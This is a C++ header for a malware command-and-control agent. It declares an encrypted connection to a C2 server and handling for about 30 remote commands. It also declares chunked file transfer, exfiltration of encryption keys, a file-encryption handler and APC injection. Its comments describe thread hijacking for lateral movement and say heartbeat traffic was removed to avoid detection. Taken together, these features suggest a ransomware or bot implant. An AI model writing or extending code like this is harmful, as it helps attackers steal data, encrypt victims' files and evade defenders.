// ============================================================================
// c2_agent.h — C2 Communication Agent
// ============================================================================
// Handles:
//   - C2 server connection with per-session ChaCha20 encryption
//   - Command receiving and processing (~30 command types)
//   - File upload/download (chunked, HEX-encoded)
//   - Background heartbeat and response listener threads
//   - Thread Hijacking / ThreadlessInject for lateral movement
// ============================================================================
#pragma once

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

#include "obfuscation.h"
#include "api_table.h"
#include "thread_hijack.h"
#include "lolbas.h"

#include <string>
#include <map>
#include <fstream>
#include <vector>
#include <random>
#include <thread>
#include <atomic>
#include <iostream>

// Forward declarations — std:: qualified (no 'using namespace std' in headers)
void registerC2State(const unsigned char* key, size_t key_len, const std::string& ip, const std::string& bot);
void secureSleep(int seconds);
void secureSleepMs(int milliseconds);

// C2 session state for sleep obfuscation
extern unsigned char c2_session_key[32];
extern std::string c2_server_ip;
extern std::string c2_bot_id;
extern bool c2_state_initialized;

// Forward declaration for global C2 agent pointer (used by gui.cpp for explicit disconnect)
class C2Agent;
extern C2Agent* g_c2_agent;

class C2Agent {
private:
    std::string server_ip;
    int server_port;
    std::string bot_id;
    int client_socket;
    bool connected;
    // Atomic: stopBackgroundThread() writes this from the GUI thread while the
    // detached C2 thread reads it in `while (running)`. A plain bool here is a
    // data race (UB) — atomic makes the stop request well-defined on every
    // platform. Semantics are unchanged (still a single boolean flag).
    std::atomic<bool> running;
    unsigned char session_key[32];  // Per-session encryption key (ChaCha20-Poly1305)
    bool session_encryption;        // Encryption enabled flag (AEAD)
    std::string recv_buffer_;       // TCP stream reassembly buffer (frames may span recv())
    std::map<std::string, std::ofstream*> upload_files_;   // Track open upload file handles
    std::map<std::string, std::string> upload_paths_;       // Track upload file paths

    // Send one framed message (4-byte BE length + encrypted payload).
    // Loops on partial TCP sends so large frames are never truncated.
    bool sendFrame(const std::string& data);



    // Internal helpers
    void generateBotID();
    bool connectToServer();
    void sendIdentification();
    void processCommand(const std::string& cmd);
    void handleUploadStart(const std::string& params);
    void handleUploadChunk(const std::string& params);
    void handleUploadEnd(const std::string& params);
    void handleEncryptFile(const std::string& file_path);
    void handleApcinject(const std::string& params);

public:
    C2Agent(const std::string& ip = "", int port = 8080);
    ~C2Agent();

    bool connect();
    void disconnect();
    void startBackgroundThread();
    void stopBackgroundThread();
    bool isConnected() const { return connected; }
    std::string getBotId() const { return bot_id; }

    // Command sending
    // NOTE: sendHeartbeat() removed — no periodic traffic pattern to avoid detection
    bool sendKeyExfil(const std::string& file_path, const std::string& algo, const std::string& key);
    bool receiveCommands();

    // Thread management
    void c2_background_thread();

    // Transport protocol
    std::string wrapForTransport(const std::string& data);
    std::string unwrapFromTransport(const std::string& data);
    std::string encryptForClient(const std::string& data);
    std::string decryptFromClient(const std::string& data);
};
